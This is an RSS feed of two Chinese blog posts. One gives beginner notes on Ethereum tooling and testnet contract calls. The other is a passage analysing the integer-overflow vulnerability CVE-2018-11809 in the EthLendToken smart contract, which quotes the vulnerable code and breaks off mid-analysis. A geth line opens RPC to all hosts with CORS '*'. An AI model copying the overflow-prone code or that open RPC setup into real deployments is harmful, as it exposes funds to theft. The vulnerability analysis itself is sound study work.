<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Hc1m1</title>
    <link>//0x48.pw/</link>
    <atom:link href="/rss.xml" rel="self" type="application/rss+xml"/>
    
    <description>水平不济整日被虐这也不会那也得学脑子太蠢天天垫底这看不懂那学不会</description>
    <pubDate>Fri, 22 Jun 2018 10:48:23 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>以太坊智能合约学习笔记1</title>
      <link>//0x48.pw/2018/06/22/0x44/</link>
      <guid>//0x48.pw/2018/06/22/0x44/</guid>
      <pubDate>Fri, 22 Jun 2018 08:40:35 GMT</pubDate>
      <description>
      
        &lt;p&gt;最近在学习智能合约，记录下学习笔记&lt;/p&gt;
      
      </description>
      
      <content:encoded><![CDATA[<p>最近在学习智能合约，记录下学习笔记</p>
<a id="more"></a>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>以太坊的智能合约是使用<code>Solidity</code>编程语言，所以首先需要搭建相关的环境</p>
<ol>
<li>以太坊</li>
</ol>
<p>使用golang开发的客户端<code>geth</code>: <code>https://github.com/ethereum/go-ethereum</code></p>
<p>相关命令:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ geth account list      # 列出以太坊账号</div><div class="line">$ geth account new       # 如果没有账号使用该命令新建一个</div><div class="line">$ geth                   # 下面列出可能需要使用的启动参数</div><div class="line">--unlock addr            # 解锁账号, 也可以到控制台使用personal解锁</div><div class="line">--testnet                # 切换到Ropsten network测试网络</div><div class="line">--datadir dir            # 设置以太坊数据存储目录</div><div class="line">--rpc --rpcaddr 0.0.0.0 --rpccorsdomain &quot;*&quot;  # 开启RPC，默认端口8545，可以通过web3.js调用</div></pre></td></tr></table></figure>
<p>下面举例使用Ropsten测试网络:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ screen -S geth</div><div class="line">$ ./geth --testnet</div><div class="line">CTRL+A D</div><div class="line">$ ./geth attach</div><div class="line">&gt;</div></pre></td></tr></table></figure>
<ol>
<li>solc编译器</li>
</ol>
<p>geth最新版已经移除了solc编译器，所以需要我们自己在本地安装一个:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm install -g solc</div></pre></td></tr></table></figure>
<p>编译出abi:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ solcjs --abi -o output test.sol</div></pre></td></tr></table></figure>
<p>如果有导入第三方库:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">$ cat test.sol </div><div class="line">pragma solidity ^0.4.18;</div><div class="line"></div><div class="line">import &apos;zeppelin-solidity/contracts/ownership/Ownable.sol&apos;;</div><div class="line"></div><div class="line">contract King is Ownable &#123;</div><div class="line"></div><div class="line">  address public king;</div><div class="line">  uint public prize;</div><div class="line"></div><div class="line">  function King() public payable &#123;</div><div class="line">    king = msg.sender;</div><div class="line">    prize = msg.value;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  function() external payable &#123;</div><div class="line">    require(msg.value &gt;= prize || msg.sender == owner);</div><div class="line">    king.transfer(msg.value);</div><div class="line">    king = msg.sender;</div><div class="line">    prize = msg.value;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">$ npm install zeppelin-solidity</div><div class="line">$ solcjs --abi -o output node_modules/zeppelin-solidity/contracts/ownership/Ownable.sol king.sol</div><div class="line">$ cat output/king_sol_King.abi </div><div class="line">[&#123;&quot;constant&quot;:false,&quot;inputs&quot;:[],&quot;name&quot;:&quot;renounceOwnership&quot;,&quot;outputs&quot;:[],&quot;payable&quot;:false,&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;&#125;,&#123;&quot;constant&quot;:true,&quot;inputs&quot;:[],&quot;name&quot;:&quot;owner&quot;,&quot;outputs&quot;:[&#123;&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;address&quot;&#125;],&quot;payable&quot;:false,&quot;stateMutability&quot;:&quot;view&quot;,&quot;type&quot;:&quot;function&quot;&#125;,&#123;&quot;constant&quot;:true,&quot;inputs&quot;:[],&quot;name&quot;:&quot;king&quot;,&quot;outputs&quot;:[&#123;&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;address&quot;&#125;],&quot;payable&quot;:false,&quot;stateMutability&quot;:&quot;view&quot;,&quot;type&quot;:&quot;function&quot;&#125;,&#123;&quot;constant&quot;:true,&quot;inputs&quot;:[],&quot;name&quot;:&quot;prize&quot;,&quot;outputs&quot;:[&#123;&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;uint256&quot;&#125;],&quot;payable&quot;:false,&quot;stateMutability&quot;:&quot;view&quot;,&quot;type&quot;:&quot;function&quot;&#125;,&#123;&quot;constant&quot;:false,&quot;inputs&quot;:[&#123;&quot;name&quot;:&quot;_newOwner&quot;,&quot;type&quot;:&quot;address&quot;&#125;],&quot;name&quot;:&quot;transferOwnership&quot;,&quot;outputs&quot;:[],&quot;payable&quot;:false,&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;&#125;,&#123;&quot;inputs&quot;:[],&quot;payable&quot;:true,&quot;stateMutability&quot;:&quot;payable&quot;,&quot;type&quot;:&quot;constructor&quot;&#125;,&#123;&quot;payable&quot;:true,&quot;stateMutability&quot;:&quot;payable&quot;,&quot;type&quot;:&quot;fallback&quot;&#125;,&#123;&quot;anonymous&quot;:false,&quot;inputs&quot;:[&#123;&quot;indexed&quot;:true,&quot;name&quot;:&quot;previousOwner&quot;,&quot;type&quot;:&quot;address&quot;&#125;],&quot;name&quot;:&quot;OwnershipRenounced&quot;,&quot;type&quot;:&quot;event&quot;&#125;,&#123;&quot;anonymous&quot;:false,&quot;inputs&quot;:[&#123;&quot;indexed&quot;:true,&quot;name&quot;:&quot;previousOwner&quot;,&quot;type&quot;:&quot;address&quot;&#125;,&#123;&quot;indexed&quot;:true,&quot;name&quot;:&quot;newOwner&quot;,&quot;type&quot;:&quot;address&quot;&#125;],&quot;name&quot;:&quot;OwnershipTransferred&quot;,&quot;type&quot;:&quot;event&quot;&#125;]</div></pre></td></tr></table></figure>
<ol>
<li>IDE</li>
</ol>
<p>ide使用的是remix-ide，可以使用在线版的: <a href="http://remix.ethereum.org/" target="_blank" rel="external">http://remix.ethereum.org/</a></p>
<p>也可以本地自己搭一个:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ npm install -g remix-ide</div><div class="line">$ remix-ide</div></pre></td></tr></table></figure>
<ol>
<li>以太坊数据查询</li>
</ol>
<p>公链数据查询: <a href="https://etherscan.io/" target="_blank" rel="external">https://etherscan.io/</a><br>Ropsten测试链: <a href="https://ropsten.etherscan.io/" target="_blank" rel="external">https://ropsten.etherscan.io/</a><br>其他查询网站: <a href="https://www.etherchain.org/" target="_blank" rel="external">https://www.etherchain.org/</a></p>
<h2 id="以太坊-区块链基础知识"><a href="#以太坊-区块链基础知识" class="headerlink" title="以太坊/区块链基础知识"></a>以太坊/区块链基础知识</h2><p>在以太坊中任何操作(转账，部署合约，调用合约函数)都是以交易的形式存在，每进行一次交易，都会加入pending列表中，同步给其他节点，当有一个节点挖出了一个区块，将会把pending列表中的所以交易打包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">&gt; eth.blockNumber</div><div class="line">5833460                       # geth客户端同步的最大区块数</div><div class="line">&gt; eth.getBlock(0)             # 获取区块信息，0是创世区块</div><div class="line">&#123;</div><div class="line">  difficulty: 17179869184,</div><div class="line">  extraData: &quot;0x11bbe8db4e347b4e8c937c1c8370e4b5ed33adb3db69cbdb7a38e1e50b1b82fa&quot;,</div><div class="line">  gasLimit: 5000,</div><div class="line">  gasUsed: 0,</div><div class="line">  hash: &quot;0xd4e56740f876aef8c010b86a40d5f56745a118d0906a34e69aec8c0db1cb8fa3&quot;,</div><div class="line">  logsBloom: &quot;0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;,</div><div class="line">  miner: &quot;0x0000000000000000000000000000000000000000&quot;,</div><div class="line">  mixHash: &quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;,</div><div class="line">  nonce: &quot;0x0000000000000042&quot;,</div><div class="line">  number: 0,</div><div class="line">  parentHash: &quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;,</div><div class="line">  receiptsRoot: &quot;0x56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421&quot;,</div><div class="line">  sha3Uncles: &quot;0x1dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347&quot;,</div><div class="line">  size: 540,</div><div class="line">  stateRoot: &quot;0xd7f8974fb5ac78d9ac099b9ad5018bedc2ce0a72dad1827a1709da30580f0544&quot;,</div><div class="line">  timestamp: 0,</div><div class="line">  totalDifficulty: 17179869184,</div><div class="line">  transactions: [],</div><div class="line">  transactionsRoot: &quot;0x56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421&quot;,</div><div class="line">  uncles: []</div><div class="line">&#125;</div><div class="line">&gt; eth.getBlock(5833460)          # 获取最新区块信息</div><div class="line">&#123;</div><div class="line">  difficulty: 3405471720099834,</div><div class="line">  extraData: &quot;0x436f72746578&quot;,</div><div class="line">  gasLimit: 7992236,</div><div class="line">  gasUsed: 7978832,</div><div class="line">  hash: &quot;0x1d7b7d1e6926c048089ecf02b0ea30d87027b168c594f4ba8fa91043e9a2faca&quot;,</div><div class="line">  logsBloom: &quot;0x021000818840a288010400002000200000002c0000408204340201204c0801000488101400000000448040431001040242401800014004900410000008e0a0000000205428000418104c050842407088081000020824200000000100102900008260104c2222050285105082040008301000041149040000006023141080000000a000080000000081401589c08002005000018008800002020a000204002810428c100006c098008280480075000900010814888809101004800000008801001400080350000008482003a9403020a0420308002088080404000002122a2488009020042b220600119502c10400760422400000445002000048be1228000000&quot;,</div><div class="line">  miner: &quot;0x9435d50503aee35c8757ae4933f7a0ab56597805&quot;,</div><div class="line">  mixHash: &quot;0xec3cff1e31ea6049ca89447e43833c2abf9c3c34f15ab679be016656dd44fd6e&quot;,</div><div class="line">  nonce: &quot;0xa02c0ff7551c38a0&quot;,</div><div class="line">  number: 5833460,</div><div class="line">  parentHash: &quot;0xbeb2058d273049a7bedc78284bb4b3d29195e46d3183b559bdb5e1e597291588&quot;,</div><div class="line">  receiptsRoot: &quot;0xb935e9bbcf039e7359694f1070b82886f8248fb195c8db1e48afc3b1c0eb9dae&quot;,</div><div class="line">  sha3Uncles: &quot;0x1dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347&quot;,</div><div class="line">  size: 37212,</div><div class="line">  stateRoot: &quot;0x5416a9c99d906d546f61f537016eac65d3dbe7745f4f5d7686ec9656057d4f42&quot;,</div><div class="line">  timestamp: 1529659415,</div><div class="line">  totalDifficulty: 4.911074548581714109311e+21,</div><div class="line">  transactions: [&quot;0x5f2a644707ec534cda626d1fd8cb0f679d0b4f5c475f95183e3326e38ec596d4&quot;......]  # 区块中打包的交易地址</div><div class="line">  transactionsRoot: &quot;0x97331e3aadd2e144f30354051a687d554c451af8d86237b36cbdc711111ea14f&quot;,</div><div class="line">  uncles: []</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在以太坊中，重要的有三个地址，个人账户地址，合约地址，交易地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"># 获取交易地址信息</div><div class="line">&gt; eth.getTransaction(&quot;0x5f2a644707ec534cda626d1fd8cb0f679d0b4f5c475f95183e3326e38ec596d4&quot;)</div><div class="line">&#123;</div><div class="line">  blockHash: &quot;0x1d7b7d1e6926c048089ecf02b0ea30d87027b168c594f4ba8fa91043e9a2faca&quot;,</div><div class="line">  blockNumber: 5833460,</div><div class="line">  from: &quot;0xd2bb24e348651970e0a3ae50ea89e5ff2b37c09b&quot;,</div><div class="line">  gas: 45000,</div><div class="line">  gasPrice: 122000000000,</div><div class="line">  hash: &quot;0x5f2a644707ec534cda626d1fd8cb0f679d0b4f5c475f95183e3326e38ec596d4&quot;,</div><div class="line">  input: &quot;0x&quot;,</div><div class="line">  nonce: 21,</div><div class="line">  r: &quot;0x5b431a69cd3ea332aad413e3e63a88a03f33305445e430257ab05b6eed1c56&quot;,</div><div class="line">  s: &quot;0x395069ef7f4848d8019c5a63f16e21b0d56baca887aa5cd3cda76b2936bf77a2&quot;,</div><div class="line">  to: &quot;0x2737062e58d2d52e7726df72e1da0828f89bd3b7&quot;,</div><div class="line">  transactionIndex: 0,</div><div class="line">  v: &quot;0x25&quot;,</div><div class="line">  value: 34100000000000000</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>不管是个人账户还是合约地址，都能储存以太币余额，两者的区别是，个人账户地址的所有者具有该地址的公私钥，能进行签名，所以能向任意个人/合约地址转账，而合约地址不具有公私钥，所以如果一个合约不具有转账的函数，这个合约将会成为一个黑洞，以太币只能存进行，但任何人都没法取出来</p>
<p>个人账户和合约地址还有一个区别，合约地址能储存数据，个人账户不行:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt; eth.getCode(&quot;0xd2bb24e348651970e0a3ae50ea89e5ff2b37c09b&quot;)  # 个人账户地址</div><div class="line">&quot;0x&quot;</div><div class="line">&gt; eth.getCode(&quot;0x0b76544F6C413a555F309Bf76260d1E02377c02A&quot;) # 合约地址</div><div class="line">&quot;0x606060405236156101255763ffffffff7c01000000000000000000000000.......</div></pre></td></tr></table></figure>
<p>智能合约会被转换成字节码储存在区块中, 但是在<a href="https://etherscan.io/" target="_blank" rel="external">https://etherscan.io/</a>网站中，一些智能合约能查看源码，这是由于合约发布者在该网站主动公布了源码，否则我们只能获取到字节码，所以智能合约的反编译也是一个有必要的工作</p>
<p>在以太坊中，基本单位是Wei，我们可以使用下面的函数将其和ether进行转换:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt; web3.toWei(1)</div><div class="line">&quot;1000000000000000000&quot;</div><div class="line">&gt; web3.fromWei(1000000000000000000)</div><div class="line">&quot;1&quot;</div></pre></td></tr></table></figure>
<h2 id="通过命令行控制智能合约"><a href="#通过命令行控制智能合约" class="headerlink" title="通过命令行控制智能合约"></a>通过命令行控制智能合约</h2><p>测试代码:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">pragma solidity ^0.4.24;</div><div class="line"></div><div class="line">contract test&#123;</div><div class="line">    </div><div class="line">    address public owner;</div><div class="line">    uint256 public value;</div><div class="line">    </div><div class="line">    function test() &#123;</div><div class="line">        owner = msg.sender;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    function test1() returns (string)&#123;</div><div class="line">        return &quot;hello&quot;;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    function () payable &#123;</div><div class="line">        value = msg.value;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>使用remix-ide在ropsten测试链上进行部署，得到合约地址: <code>0x22BAf676C25fB4a9462a6f3571769Ad98Ce6B2Cb</code></p>
<p>在ide上获取该合约的abi，去掉回车:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; abi.replace(&quot;\n&quot;, &quot;&quot;).replace(&quot;\t&quot;, &quot;&quot;)</div><div class="line">&apos;[&#123;&quot;constant&quot;: false,&quot;inputs&quot;: [],&quot;name&quot;: &quot;test1&quot;,&quot;outputs&quot;: [&#123;&quot;name&quot;: &quot;&quot;,&quot;type&quot;: &quot;string&quot;&#125;],&quot;payable&quot;: false,&quot;stateMutability&quot;: &quot;nonpayable&quot;,&quot;type&quot;: &quot;function&quot;&#125;,&#123;&quot;payable&quot;: true,&quot;stateMutability&quot;: &quot;payable&quot;,&quot;type&quot;: &quot;fallback&quot;&#125;,&#123;&quot;inputs&quot;: [],&quot;payable&quot;: false,&quot;stateMutability&quot;: &quot;nonpayable&quot;,&quot;type&quot;: &quot;constructor&quot;&#125;,&#123;&quot;constant&quot;: true,&quot;inputs&quot;: [],&quot;name&quot;: &quot;owner&quot;,&quot;outputs&quot;: [&#123;&quot;name&quot;: &quot;&quot;,&quot;type&quot;: &quot;address&quot;&#125;],&quot;payable&quot;: false,&quot;stateMutability&quot;: &quot;view&quot;,&quot;type&quot;: &quot;function&quot;&#125;,&#123;&quot;constant&quot;: true,&quot;inputs&quot;: [],&quot;name&quot;: &quot;value&quot;,&quot;outputs&quot;: [&#123;&quot;name&quot;: &quot;&quot;,&quot;type&quot;: &quot;uint256&quot;&#125;],&quot;payable&quot;: false,&quot;stateMutability&quot;: &quot;view&quot;,&quot;type&quot;: &quot;function&quot;&#125;]&apos;</div></pre></td></tr></table></figure>
<p>然后在geth命令行进行操作:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">abi = [&#123;&quot;constant&quot;: false,&quot;inputs&quot;: [],&quot;name&quot;: &quot;test1&quot;,&quot;outputs&quot;: [&#123;&quot;name&quot;: &quot;&quot;,&quot;type&quot;: &quot;string&quot;&#125;],&quot;payable&quot;: false,&quot;stateMutability&quot;: &quot;nonpayable&quot;,&quot;type&quot;: &quot;function&quot;&#125;,&#123;&quot;payable&quot;: true,&quot;stateMutability&quot;: &quot;payable&quot;,&quot;type&quot;: &quot;fallback&quot;&#125;,&#123;&quot;inputs&quot;: [],&quot;payable&quot;: false,&quot;stateMutability&quot;: &quot;nonpayable&quot;,&quot;type&quot;: &quot;constructor&quot;&#125;,&#123;&quot;constant&quot;: true,&quot;inputs&quot;: [],&quot;name&quot;: &quot;owner&quot;,&quot;outputs&quot;: [&#123;&quot;name&quot;: &quot;&quot;,&quot;type&quot;: &quot;address&quot;&#125;],&quot;payable&quot;: false,&quot;stateMutability&quot;: &quot;view&quot;,&quot;type&quot;: &quot;function&quot;&#125;,&#123;&quot;constant&quot;: true,&quot;inputs&quot;: [],&quot;name&quot;: &quot;value&quot;,&quot;outputs&quot;: [&#123;&quot;name&quot;: &quot;&quot;,&quot;type&quot;: &quot;uint256&quot;&#125;],&quot;payable&quot;: false,&quot;stateMutability&quot;: &quot;view&quot;,&quot;type&quot;: &quot;function&quot;&#125;]</div><div class="line">contract = eth.contract(abi)</div><div class="line">test=contract.at(&quot;0x22BAf676C25fB4a9462a6f3571769Ad98Ce6B2Cb&quot;)</div></pre></td></tr></table></figure>
<p>然后我们可以对该合约进行操作:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt; test.owner()     # 部署人的地址</div><div class="line">&quot;0x0109dea8b64d87a26e7fe9af6400375099c78fdd&quot;</div><div class="line">&gt; test.test1(&#123;from:eth.accounts[0]&#125;)</div><div class="line">&quot;0xf642261cb4794ba71be3a1ecf0de0b6b613961a37a7b5e213dae06bd79e1177d&quot;</div></pre></td></tr></table></figure>
<p>因为调用函数需要消耗gas，所以需要指定是哪个账号调用该合约函数，在web3js中调用函数的参数分别是，该函数本身需要的参数，以太坊相关信息参数(一个字典)，回调函数</p>
<p>以太坊相关信息参数字典:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">from: addr,</div><div class="line">to: addr,</div><div class="line">value: 1    # 转账1wei</div><div class="line">gas: 1000   # 调用该函数的过程中只允许消耗1000gas</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>向智能合约转账触发回退函数:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&gt; test.value()</div><div class="line">0</div><div class="line">&gt; eth.getBalance(test.address)</div><div class="line">0</div><div class="line">&gt; eth.sendTransaction(&#123;from:eth.accounts[0], to: test.address, value:web3.toWei(0.5)&#125;)</div><div class="line">&quot;0xb411711d15a49fdfa242f6be178d3e5aae24646569c60da9fe8f0da555416070&quot;</div><div class="line">&gt;eth.getBalance(test.address)</div><div class="line">500000000000000000</div><div class="line">&gt; test.value()</div><div class="line">500000000000000000</div></pre></td></tr></table></figure>
<p>因为该合约没有写转账代码，所以这0.5以太币就永远待在这个合约当中了，不过因为是在测试链中，所以舍得~</p>
]]></content:encoded>
      
      <comments>//0x48.pw/2018/06/22/0x44/#disqus_thread</comments>
    </item>
    
    <item>
      <title>以太坊智能合约Owner相关CVE漏洞分析</title>
      <link>//0x48.pw/2018/06/19/0x43/</link>
      <guid>//0x48.pw/2018/06/19/0x43/</guid>
      <pubDate>Tue, 19 Jun 2018 06:41:43 GMT</pubDate>
      <description>
      
        &lt;h1 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h1&gt;&lt;p&gt;最近学习了下以太坊的智能合约，而且也看到挺多厂家pr智能合约相关的漏洞，其中《ERC20智能合约整数溢出系列漏洞披露》&lt;a href=&quot;#jump1&quot;&gt;[1]&lt;/a&gt;文章中披露了6个CVE编号的漏洞，而这些漏洞都属于整型溢出漏洞范畴，其中5个漏洞均需要合约Owner才能触发利用。本文正是针对这些漏洞从合约代码及触发逻辑上做了详细分析，并提出了一些关于owner相关漏洞的思考。&lt;/p&gt;
      
      </description>
      
      <content:encoded><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>最近学习了下以太坊的智能合约，而且也看到挺多厂家pr智能合约相关的漏洞，其中《ERC20智能合约整数溢出系列漏洞披露》<a href="#jump1">[1]</a>文章中披露了6个CVE编号的漏洞，而这些漏洞都属于整型溢出漏洞范畴，其中5个漏洞均需要合约Owner才能触发利用。本文正是针对这些漏洞从合约代码及触发逻辑上做了详细分析，并提出了一些关于owner相关漏洞的思考。</p>
<a id="more"></a>
<p>#漏洞分析</p>
<h2 id="1-CVE-2018-11809"><a href="#1-CVE-2018-11809" class="headerlink" title="1. CVE-2018-11809"></a>1. CVE-2018-11809</h2><p>该漏洞被称为“超额购币”，相关合约（EthLendToken）源码: <a href="https://etherscan.io/address/0x80fB784B7eD66730e8b1DBd9820aFD29931aab03#code" target="_blank" rel="external">https://etherscan.io/address/0x80fB784B7eD66730e8b1DBd9820aFD29931aab03#code</a></p>
<p>在合约代码中，<code>buyTokensPresale</code>和<code>buyTokensICO</code>两个函数都是存在整型上溢出的情况：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">function buyTokensPresale() public payable onlyInState(State.PresaleRunning)</div><div class="line">    &#123;</div><div class="line">        // min - 1 ETH</div><div class="line">        require(msg.value &gt;= (1 ether / 1 wei));</div><div class="line">        uint newTokens = msg.value * PRESALE_PRICE;</div><div class="line"></div><div class="line">        require(presaleSoldTokens + newTokens &lt;= PRESALE_TOKEN_SUPPLY_LIMIT);</div><div class="line"></div><div class="line">        balances[msg.sender] += newTokens;</div><div class="line">        supply+= newTokens;</div><div class="line">        presaleSoldTokens+= newTokens;</div><div class="line">        totalSoldTokens+= newTokens;</div><div class="line"></div><div class="line">        LogBuy(msg.sender, newTokens);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    function buyTokensICO() public payable onlyInState(State.ICORunning)</div><div class="line">    &#123;</div><div class="line">        // min - 0.01 ETH</div><div class="line">        require(msg.value &gt;= ((1 ether / 1 wei) / 100));</div><div class="line">        uint newTokens = msg.value * getPrice();</div><div class="line"></div><div class="line">        require(totalSoldTokens + newTokens &lt;= TOTAL_SOLD_TOKEN_SUPPLY_LIMIT);</div><div class="line"></div><div class="line">        balances[msg.sender] += newTokens;</div><div class="line">        supply+= newTokens;</div><div class="line">        icoSoldTokens+= newTokens;</div><div class="line">        totalSoldTokens+= newTokens;</div><div class="line"></div><div class="line">        LogBuy(msg.sender, newTokens);</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>溢出点：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">require(presaleSoldTokens + newTokens &lt;= PRESALE_TOKEN_SUPPLY_LIMIT);</div><div class="line">require(totalSoldTokens + newTokens &lt;= TOTAL_SOLD_TOKEN_SUPPLY_LIMIT);</div></pre></td></tr></table></figure>
<p>拿<code>buyTokensPresale</code>函数举例，在理论上<code>presaleSoldTokens + newTokens</code>存在整型上溢出漏洞，会导致绕过<code>require</code>判断，造成超额购币。</p>
<p>接下来，我们再仔细分析一下，如果造成整型上溢出，先来看看<code>presaleSoldTokens</code>变量的最大值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">uint public presaleSoldTokens = 0;</div><div class="line">require(presaleSoldTokens + newTokens &lt;= PRESALE_TOKEN_SUPPLY_LIMIT);</div><div class="line">presaleSoldTokens+= newTokens;</div></pre></td></tr></table></figure>
<p>该合约代码中，<code>presaleSoldTokens</code>变量相关的代码只有这三行，因为存在着require判断，所以不论<code>presaleSoldTokens + newTokens</code>是否溢出，<code>presaleSoldTokens &lt;= PRESALE_TOKEN_SUPPLY_LIMIT</code>恒成立，因为有着断言代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">assert(PRESALE_TOKEN_SUPPLY_LIMIT==60000000 * (1 ether / 1 wei));</div></pre></td></tr></table></figure>
